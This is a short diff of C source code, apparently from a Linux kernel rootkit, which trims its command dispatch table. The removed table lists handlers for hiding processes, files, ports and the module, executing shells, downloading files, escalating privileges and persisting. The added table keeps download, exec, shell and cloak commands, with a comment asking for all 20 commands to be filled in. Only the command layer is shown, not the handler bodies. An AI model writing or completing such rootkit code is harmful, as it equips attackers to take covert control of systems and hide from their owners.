@@ -9,33 +9,17 @@ struct rk_dispatch_entry {
 	rk_handler_t	handler;
 };
 
-// Longer prefixes first so "UNHIDE CONTENT" matches before "HIDE CONTENT".
-// Trailing space in prefix means the command takes an argument.
-// No trailing space means exact-match only (no argument).
+// Expand this table with all 20 commands.
+// Longer prefixes first (greedy match).
 static const struct rk_dispatch_entry dispatch_table[] = {
-	{ "UNHIDE CONTENT ", 15, cmd_unhide_content },
-	{ "UNHIDE MODULE",   13, cmd_unhide_module  },
-	{ "HIDE CONTENT ",   13, cmd_hide_content   },
-	{ "SHELL STATUS",    12, cmd_shell_status   },
-	{ "EXEC_SHELL ",     11, cmd_exec_shell     },
-	{ "UNHIDE FILE ",    12, cmd_unhide_file    },
-	{ "UNHIDE PORT ",    12, cmd_unhide_port    },
-	{ "HIDE MODULE",     11, cmd_hide_module    },
-	{ "UNHIDE PID ",     11, cmd_unhide_pid     },
-	{ "UNHIDE ALL",      10, cmd_unhide_all     },
-	{ "HIDE FILE ",      10, cmd_hide_file      },
-	{ "HIDE PORT ",      10, cmd_hide_port      },
-	{ "HIDE PID ",        9, cmd_hide_pid       },
-	{ "DOWNLOAD ",        9, cmd_download       },
-	{ "ESCALATE ",        9, cmd_escalate       },
-	{ "UNPERSIST",        9, cmd_unpersist      },
-	{ "PERSIST",          7, cmd_persist        },
-	{ "STATUS",           6, cmd_status         },
-	{ "SHELL ",           6, cmd_shell          },
-	{ "LIST ",            5, cmd_list           },
-	{ "PING",             4, cmd_ping           },
-	{ "QUIT",             4, cmd_quit           },
-	{ "INFO",             4, cmd_info           },
+	{ "DOWNLOAD ",  9, cmd_download },
+	{ "EXEC ",      5, cmd_exec     },
+	{ "UNCLOAK",    7, cmd_uncloak  },
+	{ "STATUS",     6, cmd_status   },
+	{ "SHELL",      5, cmd_shell    },
+	{ "CLOAK",      5, cmd_cloak    },
+	{ "PING",       4, cmd_ping     },
+	{ "INFO",       4, cmd_info     },
 };
 
 static size_t strip_trailing(const u8 *buf, size_t len)
